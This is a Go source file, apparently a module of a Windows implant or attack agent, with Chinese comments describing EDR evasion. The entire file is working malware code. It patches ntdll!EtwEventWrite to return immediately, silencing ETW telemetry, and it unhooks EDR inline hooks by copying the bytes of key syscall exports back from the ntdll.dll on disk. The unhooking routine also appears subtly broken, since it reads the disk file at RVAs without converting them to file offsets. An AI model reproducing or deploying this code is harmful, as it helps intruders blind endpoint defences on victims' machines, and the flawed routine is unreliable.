//go:build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ===== A1: EDR 规避 =====
// 1. ETW 补丁：劫持 ntdll.EtwEventWrite 为 ret，屏蔽 ETW 遥测
// 2. ntdll unhooking：从磁盘重读 ntdll.dll，恢复被 EDR 内联 hook 的导出函数

var (
	evKernel32 = syscall.NewLazyDLL("kernel32.dll")
	evNtdll    = syscall.NewLazyDLL("ntdll.dll")
	evLoadLib  = evKernel32.NewProc("LoadLibraryW")
	evGetProc  = evKernel32.NewProc("GetProcAddress")
	evVProtect = evKernel32.NewProc("VirtualProtect")
)

// PatchETW 将 ntdll!EtwEventWrite 前若干字节改为 ret（0xC3），屏蔽进程 ETW 遥测。
// 通过 LoadLibraryW("ntdll.dll") + GetProcAddress 获取导出地址，避免直接引用。
func PatchETW() (string, error) {
	modHandle, _, err := evLoadLib.Call(uintptr(unsafe.Pointer(utf16Ptr("ntdll.dll"))))
	if modHandle == 0 {
		return "", fmt.Errorf("LoadLibraryW(ntdll) 失败: %v", err)
	}
	etwProc, _, err := evGetProc.Call(modHandle, uintptr(unsafe.Pointer(utf16Ptr("EtwEventWrite"))))
	if etwProc == 0 {
		return "", fmt.Errorf("GetProcAddress(EtwEventWrite) 失败: %v", err)
	}

	// 前 5 字节替换为 ret（0xC3）——最小 patch（EtwEventWrite 是 x64 前导 5 字节）
	const patchLen = 5
	var oldProtect uint32
	ret, _, _ := evVProtect.Call(etwProc, patchLen, windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	if ret == 0 {
		return "", fmt.Errorf("VirtualProtect 失败")
	}
	patch := [5]byte{0xC3, 0x00, 0x00, 0x00, 0x00} // ret; nop padding
	copy((*[patchLen]byte)(unsafe.Pointer(etwProc))[:], patch[:])
	evVProtect.Call(etwProc, patchLen, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

	return fmt.Sprintf("[+] ETW patched: EtwEventWrite @ 0x%x -> ret", etwProc), nil
}

// UnhookNtdll 从磁盘重读 ntdll.dll，恢复被 EDR 内联 hook 的导出函数前 16 字节。
// 仅处理关键 syscall 导出（数量有限），避免全量导出遍历的开销与风险。
func UnhookNtdll() (string, error) {
	sysDir, err := windows.GetSystemDirectory()
	if err != nil {
		return "", err
	}
	diskPath := sysDir + `\ntdll.dll`
	diskData, err := os.ReadFile(diskPath)
	if err != nil {
		return "", fmt.Errorf("读取磁盘 ntdll 失败: %v", err)
	}

	// 解析磁盘 ntdll 的导出表，收集目标函数名 -> RVA
	targets := map[string]bool{
		"NtProtectVirtualMemory": true,
		"NtWriteVirtualMemory":   true,
		"NtCreateThreadEx":       true,
		"NtAllocateVirtualMemory": true,
		"NtOpenProcess":          true,
		"NtReadVirtualMemory":    true,
		"NtQuerySystemInformation": true,
		"NtCreateFile":           true,
		"NtOpenKey":              true,
		"NtQueryInformationProcess": true,
		"NtDuplicateObject":      true,
		"NtSetInformationThread": true,
		"EtwEventWrite":          true,
		"EtwEventWriteFull":      true,
		"EtwEventWriteEx":        true,
		"EtwEventEnabled":        true,
		"EtwTraceEvent":          true,
		"RtlUserThreadStart":     true,
		"RtlDispatchException":   true,
		"LdrLoadDll":             true,
		"LdrUnloadDll":           true,
		"NtMapViewOfSection":     true,
		"NtUnmapViewOfSection":   true,
		"NtClose":                true,
	}
	diskRVAs, err := parseNtdllExports(diskData, targets)
	if err != nil {
		return "", err
	}

	// 当前内存中的 ntdll 基址
	modBase, err := getModuleBase("ntdll.dll")
	if err != nil {
		return "", err
	}

	restored := 0
	for _, rva := range diskRVAs {
		addr := modBase + uintptr(rva)
		// 读取内存前 16 字节与磁盘比对
		memBytes := (*[16]byte)(unsafe.Pointer(addr))
		diskBytes := diskData[rva : rva+16]
		if memBytes == nil {
			continue
		}
		// 检查是否被修改
		different := false
		for i := 0; i < 16; i++ {
			if memBytes[i] != diskBytes[i] {
				different = true
				break
			}
		}
		if !different {
			continue
		}
		// 恢复：写回磁盘字节
		var oldProtect uint32
		evVProtect.Call(addr, 16, windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
		for i := 0; i < 16; i++ {
			memBytes[i] = diskBytes[i]
		}
		evVProtect.Call(addr, 16, uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
		restored++
	}

	return fmt.Sprintf("[+] ntdll unhooked: 恢复 %d 个函数（目标 %d 个）", restored, len(diskRVAs)), nil
}

// parseNtdllExports 解析 PE 导出表，返回目标函数名 -> 文件内 RVA
func parseNtdllExports(data []byte, targets map[string]bool) (map[string]uint32, error) {
	if len(data) < 0x40 || data[0] != 'M' || data[1] != 'Z' {
		return nil, fmt.Errorf("非法 PE 文件")
	}
	peOff := binary.LittleEndian.Uint32(data[0x3C:])
	if int(peOff)+24 > len(data) || string(data[peOff:peOff+4]) != "PE\x00\x00" {
		return nil, fmt.Errorf("非法 PE 头")
	}
	optOff := peOff + 24
	optMagic := binary.LittleEndian.Uint16(data[optOff:])
	var exportRVA, exportSize uint32
	if optMagic == 0x20B { // PE32+
		exportRVA = binary.LittleEndian.Uint32(data[optOff+112:])
		exportSize = binary.LittleEndian.Uint32(data[optOff+116:])
	} else {
		return nil, fmt.Errorf("仅支持 PE32+ (x64)")
	}
	if exportRVA == 0 || int(exportRVA)+int(exportSize) > len(data) {
		return nil, fmt.Errorf("导出表越界")
	}
	// 从导出表读取：NumberOfNames, AddressOfNames, AddressOfNameOrdinals
	exp := exportRVA
	numNames := binary.LittleEndian.Uint32(data[exp+24:])
	addrNames := binary.LittleEndian.Uint32(data[exp+32:])
	addrOrdinals := binary.LittleEndian.Uint32(data[exp+36:])
	addrFuncs := binary.LittleEndian.Uint32(data[exp+28:])

	result := make(map[string]uint32)
	for i := uint32(0); i < numNames; i++ {
		if int(addrNames)+int(i)*4+4 > len(data) {
			break
		}
		nameRVA := binary.LittleEndian.Uint32(data[addrNames+i*4:])
		if int(nameRVA) >= len(data) {
			continue
		}
		name := cstringAt(data, nameRVA)
		if targets[name] {
			ordIdx := binary.LittleEndian.Uint16(data[addrOrdinals+i*2:])
			funcRVA := binary.LittleEndian.Uint32(data[addrFuncs+uint32(ordIdx)*4:])
			result[name] = funcRVA
		}
	}
	if len(result) == 0 {
		return nil, fmt.Errorf("导出表中未找到目标函数（磁盘 ntdll 与系统不匹配？）")
	}
	return result, nil
}

// cstringAt 读取以 NUL 结尾的字符串
func cstringAt(data []byte, off uint32) string {
	end := int(off)
	for end < len(data) && data[end] != 0 {
		end++
	}
	return string(data[off:end])
}

// getModuleBase 获取模块基址（GetModuleHandleW via LazyDLL，兼容性好）
func getModuleBase(name string) (uintptr, error) {
	modHandle, _, err := evLoadLib.Call(uintptr(unsafe.Pointer(utf16Ptr(name))))
	if modHandle == 0 {
		// 已加载模块：用 GetModuleHandleW
		getMod := evKernel32.NewProc("GetModuleHandleW")
		h, _, _ := getMod.Call(uintptr(unsafe.Pointer(utf16Ptr(name))))
		if h == 0 {
			return 0, fmt.Errorf("GetModuleHandle(%s) 失败: %v", name, err)
		}
		return h, nil
	}
	return modHandle, nil
}

// utf16Ptr 便捷 UTF16 指针（供 lazy proc 调用）
func utf16Ptr(s string) *uint16 {
	p, _ := syscall.UTF16PtrFromString(s)
	return p
}

// CmdEtwPatch ETW 补丁命令入口
func CmdEtwPatch() ([]byte, error) {
	msg, err := PatchETW()
	if err != nil {
		return []byte("[!] " + err.Error()), err
	}
	return []byte(msg), nil
}

// CmdUnhookNtdll ntdll unhooking 命令入口
func CmdUnhookNtdll() ([]byte, error) {
	msg, err := UnhookNtdll()
	if err != nil {
		return []byte("[!] " + err.Error()), err
	}
	return []byte(msg), nil
}

// 保持 strings 导入（供后续扩展）
var _ = strings.TrimSpace
